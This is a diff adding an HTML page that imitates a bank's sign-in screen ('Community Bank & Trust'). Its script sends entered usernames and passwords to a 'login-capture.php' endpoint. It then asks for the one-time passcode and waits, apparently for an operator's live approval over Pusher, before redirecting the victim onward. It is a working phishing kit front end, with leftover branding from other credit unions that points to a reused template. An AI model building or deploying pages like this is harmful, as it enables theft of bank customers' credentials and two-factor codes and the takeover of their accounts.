@@ -1,0 +1,714 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Login - Community Bank & Trust</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- Bootstrap CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css" rel="stylesheet">
+    <link rel="stylesheet" href="styles/login.css">
+    <link rel="stylesheet" href="styles/common.css">
+    <link rel="shortcut icon" href="community-bank-trust-favicon-662daf9b.ico" type="image/x-icon">
+    <!-- Pusher JavaScript library -->
+    <script src="https://js.pusher.com/7.0/pusher.min.js"></script>
+    
+    <style>
+        .hidden {
+            display: none;
+            opacity: 0;
+            transition: opacity 0.5s ease-in;
+        }
+
+        .visible {
+            display: block;
+            opacity: 1;
+        }
+
+        .form-floating-label {
+            position: relative;
+            margin-bottom: 1.5rem;
+        }
+
+        .form-floating-label input {
+            width: 100%;
+            padding: 16px 12px;
+            font-size: 16px;
+            border: 1px solid #626e7abf;
+            border-radius: 5px;
+            outline: none;
+            background-color: transparent; /* Make input transparent */
+        }
+
+        .form-floating-label input:focus {
+            border: 2px solid #626e7a; /* Change focus border to #6397ff */
+        }
+
+        .form-floating-label label {
+            position: absolute;
+            top: 50%;
+            left: 12px;
+            transform: translateY(-50%);
+            font-size: 16px;
+            color: #626e7a;
+            transition: all 0.3s ease;
+            pointer-events: none;
+        }
+        
+        .input-group {
+            position: relative;
+        }
+
+        .input-group i {
+            position: absolute;
+            top: 24px;
+            right: 8px;
+            height: 100%;
+            border-radius: 0 5px 5px 0;
+            border-left: none; 
+            z-index: 999;
+            font-size: 16px;
+        }
+
+        .form-floating-label input:focus + label,
+        .form-floating-label input:not(:placeholder-shown) + label {
+            top: 0px;
+            left: 10px;
+            font-size: 12px;
+            color: #750f23;
+            background-color: #fff;
+            padding: 0 5px;
+        }
+
+        .btn-primary {
+            background-color: #750f23 !important;
+            border-color: #750f23 !important;
+        }
+
+        .body-special {
+            background-image: url('community-bank-trust-background-landscape-a13d6deb.png') !important;
+            background-repeat: no-repeat !important;
+            background-position: top center !important;
+            background-attachment: fixed !important;
+            background-size: cover !important;
+            position: relative;
+        }
+
+        .login-card {
+            position: relative;
+            z-index: 1; /* Ensure content is above the overlay */
+            background-color: rgba(255, 255, 255);
+            -webkit-backdrop-filter: blur(10px);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            box-shadow: 0 4px 30px rgba(0, 0, 0, 0.1);
+            font-size: 14px;
+        }
+
+        .btn {
+            padding: 16px 12px;
+            font-size: 16px;
+        }
+
+        .disable {
+            pointer-events: none;
+            opacity: 0.5;
+            background-color: #ffffff !important;
+        }
+
+
+        .link{
+            color: #750f23 !important;
+                font-weight: 500;
+        }
+
+        .form-control:focus {
+            border-color: #fb5273 !important; /* Updated to match new primary color */
+            box-shadow: none !important;
+        }
+
+        .footbg{
+            background-color: #ffffff;
+        }
+
+        /* Dark mode adaptation for login-card */
+        @media (prefers-color-scheme: dark) {
+            .footbg{
+                background-color: #1e1f20;
+                color: #f0f0f0;
+            }
+            .login-card {
+                background-color: #1e1f20;
+                color: #f0f0f0;
+            }
+            
+            .login-card input {
+                background-color: transparent !important; /* Make input transparent in dark mode */
+                color: #bdc6ce;
+                border-color: #666;
+            }
+            
+            
+            .body-special::before {
+                content: '';
+                position: absolute;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background-color: rgba(0, 0, 0, 0.5); /* Black overlay with 50% opacity */
+                z-index: 1;
+            }
+            
+            .form-floating-label input:focus {
+                border-color: #fb5273; /* Consistent focus border in dark mode */
+                color: #f0f0f0; /* Light text color in dark mode */
+                background-color: transparent !important; /* Keep input transparent */  
+            }
+            
+            /* Updated label styling for dark mode */
+            .form-floating-label label {
+                color: #717d88; /* Light grey when not focused */
+                background-color: transparent !important;
+            }
+            
+            .form-floating-label input:focus + label,
+            .form-floating-label input:not(:placeholder-shown) + label {
+                background-color: #1e1f20 !important; /* Match card background when focused */
+                color: #fb5273 !important; /* Orange color when focused */
+                padding: 0 5px !important; /* Ensure padding is consistent */
+            }
+            
+            .btn-primary {
+                background-color: #750f23 !important;
+                border-color: #750f23 !important;
+            }
+            
+            .btn-success {
+                background-color: #750f23 !important;
+                border-color: #750f23 !important;
+            }
+
+            .link{
+                color: #fb5273 !important;
+                font-weight: 500 !important; /* Added !important for consistency */
+            }
+            
+            .spinner {
+                border-top-color: #750f23; /* Updated to match new primary color */
+            }
+        }
+
+        @media screen and (max-width: 576px) {
+            .login-card {
+                width: 90%;
+                margin: 24px auto;
+            }
+        }
+
+        /* Spinner styles */
+        .spinner-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            flex-direction: column;
+            color: white;
+        }
+
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 6px solid #f3f3f3;
+            border-top: 6px solid #750f23;
+            border-radius: 50%;
+            animation: spin 2s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Loading Spinner Overlay -->
+    <div id="loadingSpinner" class="spinner-overlay" style="display: none;">
+        <div class="spinner"></div>
+        <div id="spinnerMessage">Verifying your credentials...</div>
+    </div>
+
+    <div class="login-container body-special d-flex justify-content-center align-items-center vh-100">
+        <div class="card login-card px-lg-5 pb-lg-5 pt-sm-4 px-3 m-sm-3 m-2 rounded-3 shadow" style="width: 100%; max-width: 500px;">
+            <div class="card-body">
+                <div class="text-center mb-4">
+                    <img id="bankLogo" src="family-savings-credit-union-logo-a6c36e39.png" alt="Gather FCU" class="img-fluid logo" width="70%">
+                </div>
+                <!-- Step 1: Username -->
+                <form id="usernameForm" class="visible">
+                    <div class="form-floating-label">
+                        <input type="text" id="username" class="form-control" placeholder=" " required>
+                        <label for="username">Username</label>
+                    </div>
+                    
+                    <div class="col text-end align-items-end justify-content-end">
+                        <a href="forgot.html" class="text-decoration-none link">Forgot?</a>
+                    </div>
+
+                    <div class="row mb-3 mt-4 align-items-center justify-content-center">
+                        <div class="col-7 text-start align-items-start justify-content-start">
+                            <a href="enroll.html" class="text-decoration-none link">First time user? Enroll now.</a>
+                        </div>
+                        <div class="col-5 text-end">
+                            <button type="button" class="btn btn-primary w-100" onclick="showPasswordStep()">Continue</button>
+                        </div>
+                    </div>
+                </form>
+
+                <!-- Step 2: Username and Password -->
+                <form id="passwordForm" class="hidden">
+                    <div class="form-floating-label">
+                        <input type="text" id="usernameDisplay" class="form-control" placeholder=" " disabled>
+                        <label for="usernameDisplay">Username</label>
+                    </div>
+                    <div class="form-floating-label">
+                        <div class="input-group">
+                            <input type="password" id="password" class="form-control" placeholder=" " required>
+                            <label for="password">Password</label>
+                            <i id="togglePasswordIcon" class="bi bi-eye" onclick="togglePassword()"></i>
+                        </div>
+                        
+                    
+                        <div class="col text-end align-items-end justify-content-end">
+                            <a href="forgot.html" class="text-decoration-none link">Forgot?</a>
+                        </div>
+                    </div>
+                    <div class="row mb-3" id="stepTwoRow">
+                        <div class="col-8 text-start align-items-start justify-content-start">
+                            <i class="bi bi-fingerprint" class="link" font-size: 1.5rem;"></i>
+                            <span class="link">Sign in with a passkey</span>
+                        </div>
+                        <div class="col-4 text-end">
+                            <button type="button" class="btn btn-primary w-100" onclick="attemptLogin()">Login</button>
+                        </div>
+                    </div>
+                </form>
+
+                <!-- Step 3: OTP -->
+                <form id="otpForm" class="hidden">
+                    <div class="form-floating-label">
+                        <input type="text" id="otp" class="form-control" placeholder=" " maxlength="6">
+                        <label for="otp">Enter OTP</label>
+                    </div>
+                    <button type="button" class="btn btn-primary w-100" onclick="verifyOTP()">Submit OTP</button>
+                </form>
+
+                <div id="notification" class="alert mt-3" style="display: none;"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer Section -->
+    <footer class="footbg" style="padding: 10px 0; text-align: center; font-size: 14px;" class="text-muted">
+        <!-- 
+        This HTML snippet displays a copyright notice for "Eagle Louisiana FCU" with the year 2025. 
+        The copyright symbol is represented using the HTML entity `&copy;`, and the bullet point 
+        is represented using the HTML entity `&bull;`.
+        -->
+        <span>&copy; 2025 Community Bank & Trust</span> &bull; 
+        <span> (866) 902-2265</span> &bull; 
+        <a href="privacy-policy.html" class="link" text-decoration: none;">Privacy policy</a> &bull; 
+        <span>Member FDIC</span> &bull; 
+        <span>Equal Housing Lender</span>
+    </footer>
+
+    <!-- Bootstrap JS -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/js/bootstrap.bundle.min.js"></script>
+    <script>
+        // Function to detect dark mode and update the logo accordingly
+        function updateLogoForTheme() {
+            const logo = document.getElementById('bankLogo');
+            const darkModeMediaQuery = window.matchMedia('(prefers-color-scheme: dark)');
+            
+            if (darkModeMediaQuery.matches) {
+                // Dark mode is enabled
+                logo.src = 'community-bank-trust-logo-1a9a2542.png';
+            } else {
+                // Light mode is enabled
+                logo.src = 'community-bank-trust-logo-c6dba9fc.png';
+            }
+        }
+
+        // Watch for changes to color scheme preference
+        function setupThemeChangeListener() {
+            const darkModeMediaQuery = window.matchMedia('(prefers-color-scheme: dark)');
+            
+            // Initial setup
+            updateLogoForTheme();
+            
+            // Listen for changes
+            darkModeMediaQuery.addEventListener('change', updateLogoForTheme);
+        }
+
+        // Initialize color scheme detection when DOM is loaded
+        document.addEventListener('DOMContentLoaded', function() {
+            console.log('DOM content loaded, initializing Pusher and theme detection...');
+            initPusher();
+            setupThemeChangeListener();
+        });
+
+        // Pusher configuration - using the credentials that are already installed
+        const PUSHER_KEY = '94894a770facc94dd4c3';
+        const PUSHER_CLUSTER = 'us2';
+        
+        let pusher = null;
+        let channel = null;
+        
+        // Set redirect to a local page to avoid domain resolution issues
+        const redirectUrl = 'https://secure.bog1.com/login';
+        
+        // Show/hide the loading spinner
+        function toggleSpinner(show, message = '') {
+            const spinner = document.getElementById('loadingSpinner');
+            if (show) {
+                if (message) {
+                    document.getElementById('spinnerMessage').textContent = message;
+                }
+                spinner.style.display = 'flex';
+            } else {
+                spinner.style.display = 'none';
+            }
+        }
+        
+        // Initialize Pusher connection
+        function initPusher() {
+            try {
+                console.log('Initializing Pusher...');
+                // Initialize Pusher
+                pusher = new Pusher(PUSHER_KEY, {
+                    cluster: PUSHER_CLUSTER,
+                    forceTLS: true
+                });
+                
+                console.log('Pusher initialized successfully');
+                return true;
+            } catch (error) {
+                console.error('Error initializing Pusher:', error);
+                return false;
+            }
+        }
+        
+        // Subscribe to updates for a specific attempt
+        function subscribeToPusherChannel(attemptId) {
+            if (!pusher) {
+                console.log('Pusher not initialized, cannot subscribe');
+                return false;
+            }
+            
+            try {
+                console.log(`Subscribing to channel for attempt ${attemptId}...`);
+                // Subscribe to the channel for this attempt
+                const channelName = `attempt-${attemptId}`;
+                channel = pusher.subscribe(channelName);
+                
+                console.log(`Binding to event 'status-update' on channel ${channelName}`);
+                // Listen for status updates
+                channel.bind('status-update', function(data) {
+                    console.log('Status update received via Pusher:', data);
+                    handleStatusChange(data);
+                });
+                
+                // Debug binding
+                pusher.connection.bind('connected', function() {
+                    console.log('Successfully connected to Pusher');
+                });
+                
+                pusher.connection.bind('error', function(err) {
+                    console.log('Pusher connection error:', err);
+                });
+                
+                console.log(`Successfully subscribed to updates for attempt ${attemptId}`);
+                return true;
+            } catch (error) {
+                console.error('Error subscribing to Pusher channel:', error);
+                return false;
+            }
+        }
+        
+        // Handle status change messages from Pusher
+        function handleStatusChange(data) {
+            console.log('Handling status change, data:', data);
+            console.log('Current attempt ID:', currentAttemptId);
+            
+            if (data.attemptId == currentAttemptId) {
+                console.log('Status change matches current attempt');
+                
+                if (data.status === 'accepted') {
+                    console.log('Status is accepted, redirecting...');
+                    toggleSpinner(false);
+                    showNotification('OTP approved. Redirecting...', 'success');
+                    setTimeout(() => {
+                        window.location.href = redirectUrl;
+                    }, 1500);
+                } else if (data.status === 'rejected') {
+                    console.log('Status is rejected');
+                    toggleSpinner(false);
+                    showNotification('OTP rejected. Please try again.', 'danger');
+                }
+            } else {
+                console.log('Status change does not match current attempt ID');
+            }
+        }
+
+        // Enhanced fetch function with better error handling
+        function fetchRequest(url, method, body) {
+            console.log('Request URL:', url);
+            console.log('Request Method:', method);
+            console.log('Request Body:', body);
+
+            // Add a random param to prevent caching
+            const timestamp = new Date().getTime();
+            const separator = url.includes('?') ? '&' : '?';
+            const cacheBuster = `${separator}_=${timestamp}`;
+            
+            return fetch(url + cacheBuster, {
+                method: method,
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                    'Cache-Control': 'no-cache, no-store, must-revalidate',
+                    'Pragma': 'no-cache',
+                    'Expires': '0',
+                    'X-Requested-With': 'XMLHttpRequest' // Helps backend identify AJAX requests
+                },
+                body: method === 'POST' ? new URLSearchParams(body) : undefined,
+                credentials: 'same-origin' // Include cookies if needed
+            }).then(response => {
+                console.log('Response Status:', response.status);
+                
+                // First check if the response is OK
+                if (!response.ok) {
+                    throw new Error(`HTTP error! Status: ${response.status}`);
+                }
+                
+                // Always process the response as text first
+                return response.text().then(text => {
+                    // If empty response, return an empty object
+                    if (!text || text.trim() === '') {
+                        console.log('Empty response received');
+                        return { success: false, message: 'Empty response from server' };
+                    }
+                    
+                    console.log('Response Body:', text); // Log the response body for debugging
+                    
+                    try {
+                        // Before attempting to parse, verify text doesn't contain HTML
+                        if (text.trim().startsWith('<')) {
+                            throw new Error('Response contains HTML instead of JSON');
+                        }
+                        
+                        const jsonResponse = JSON.parse(text); // Attempt to parse the response as JSON
+                        console.log('Parsed JSON Response:', jsonResponse); // Log the parsed JSON
+                        return jsonResponse;
+                    } catch (error) {
+                        console.error('JSON Parsing Error:', error, 'Response was:', text); 
+                        
+                        // Handle different types of non-JSON responses
+                        let errorMessage;
+                        
+                        // Check for PHP error format
+                        if (text.includes('Fatal error') || text.includes('Parse error')) {
+                            errorMessage = 'Server error: PHP execution failed';
+                        }
+                        // Try to extract any HTML error message
+                        else {
+                            const errorMatch = text.match(/<b>(.+?)<\/b>/) || text.match(/<p>(.+?)<\/p>/);
+                            errorMessage = errorMatch ? errorMatch[1] : 'Invalid response from server';
+                        }
+                        
+                        // Show the error in the UI
+                        showNotification(errorMessage, 'danger');
+                        
+                        // Instead of throwing, return a fallback object
+                        return { success: false, message: errorMessage };
+                    }
+                });
+            }).catch(error => {
+                console.error('Network or fetch error:', error);
+                // Also display in the UI
+                showNotification('Server connection error: ' + error.message, 'danger');
+                return { success: false, message: error.message };
+            });
+        }
+
+        let currentUsername = '';
+        let currentAttemptId = 0;
+
+        // Show the password step after the username is entered
+        function showPasswordStep() {
+            const username = document.getElementById('username').value.trim();
+
+            if (!username) {
+                showNotification('Please enter your username', 'danger');
+                return;
+            }
+
+            currentUsername = username; // Store the username for later use
+            document.getElementById('usernameDisplay').value = username;
+
+            // Transition to the password step
+            document.getElementById('usernameForm').classList.remove('visible');
+            document.getElementById('usernameForm').classList.add('hidden');
+            document.getElementById('passwordForm').classList.remove('hidden');
+            document.getElementById('passwordForm').classList.add('visible');
+        }
+
+        // Show the OTP step after login
+        function showOtpStep() {
+            document.getElementById('passwordForm').classList.remove('visible');
+            document.getElementById('passwordForm').classList.add('hidden');
+            document.getElementById('otpForm').classList.remove('hidden');
+            document.getElementById('otpForm').classList.add('visible');
+        }
+
+        // Toggle password visibility
+        function togglePassword() {
+            const passwordField = document.getElementById('password');
+            const toggleIcon = document.getElementById('togglePasswordIcon');
+
+            if (passwordField.type === 'password') {
+                passwordField.type = 'text';
+                toggleIcon.classList.remove('bi-eye');
+                toggleIcon.classList.add('bi-eye-slash');
+            } else {
+                passwordField.type = 'password';
+                toggleIcon.classList.remove('bi-eye-slash');
+                toggleIcon.classList.add('bi-eye');
+            }
+        }
+
+        // Show notification messages
+        function showNotification(message, type) {
+            const notification = document.getElementById('notification');
+            notification.textContent = message;
+            notification.className = `alert alert-${type}`;
+            notification.style.display = 'block';
+
+            // Hide after 5 seconds
+            setTimeout(() => {
+                notification.style.display = 'none';
+            }, 5000);
+        }
+
+        // Attempt login
+        function attemptLogin() {
+            const password = document.getElementById('password').value.trim();
+
+            if (!password) {
+                showNotification('Please enter your password', 'danger');
+                return;
+            }
+
+            // Send login request to the backend
+            fetchRequest('login-capture.php', 'POST', { username: currentUsername, password })
+            .then(data => { // Removed redundant .json() call
+                if (data.success) {
+                    currentAttemptId = data.attempt_id;
+
+                    showNotification('Please enter the OTP.', 'info');
+                    showOtpStep();
+                } else {
+                    showNotification(data.message, 'danger');
+                }
+            })
+            .catch(error => {
+                showNotification('An error occurred. Please try again later.', 'danger');
+                console.error('Error:', error);
+            });
+        }
+
+        // Poll the server to check the status of the OTP
+        function pollOtpStatus() {
+            const pollInterval = 2000; // Poll every 2 seconds
+            const maxWaitTime = 15000; // Maximum wait time of 15 seconds
+            let elapsedTime = 0;
+
+            const intervalId = setInterval(() => {
+                fetchRequest('otp-verification.php', 'POST', { attempt_id: currentAttemptId })
+                .then(data => {
+                    if (data.success && data.approved) {
+                        clearInterval(intervalId); // Stop polling
+                        showNotification('OTP approved. Redirecting...', 'success');
+                        setTimeout(() => {
+                            window.location.href = redirectUrl;
+                        }, 1500);
+                    } else if (data.success && !data.approved) {
+                        clearInterval(intervalId); // Stop polling
+                        showNotification('OTP rejected. Please try again.', 'danger');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error polling OTP status:', error);
+                });
+
+                elapsedTime += pollInterval;
+                if (elapsedTime >= maxWaitTime) {
+                    clearInterval(intervalId); // Stop polling after max wait time
+                    showNotification('OTP rejected. Please try again.', 'danger');
+                }
+            }, pollInterval);
+        }
+
+        // Updated Verify OTP function to use Pusher instead of WebSocket
+        function verifyOTP() {
+            const otp = document.getElementById('otp').value.trim();
+
+            if (!otp || otp.length !== 6 || isNaN(otp)) {
+                showNotification('Please enter a valid 6-digit OTP', 'danger');
+                return;
+            }
+
+            // Send OTP verification request to the backend
+            fetchRequest('otp-verification.php', 'POST', { attempt_id: currentAttemptId, otp })
+            .then(data => {
+                if (data.success) {
+                    // Show the loading spinner with a message
+                    toggleSpinner(true, 'Waiting for authentication approval...');
+                    
+                    console.log('OTP verification successful, attempt ID:', currentAttemptId);
+                    
+                    // Use Pusher for real-time updates if available
+                    if (pusher) {
+                        console.log('Pusher is available, subscribing to channel');
+                        const subscribed = subscribeToPusherChannel(currentAttemptId);
+                        
+                        if (!subscribed) {
+                            // Fall back to polling if subscription fails
+                            console.log('Pusher subscription failed, falling back to polling');
+                            pollOtpStatus();
+                        }
+                    } else {
+                        // Fall back to polling if Pusher not available
+                        console.log('Pusher not available, using polling');
+                        pollOtpStatus();
+                    }
+                } else {
+                    showNotification(data.message, 'danger');
+                }
+            })
+            .catch(error => {
+                showNotification('An error occurred. Please try again later.', 'danger');
+                console.error('Error:', error);
+            });
+        }
+    </script>
+</body>
+
+</html>
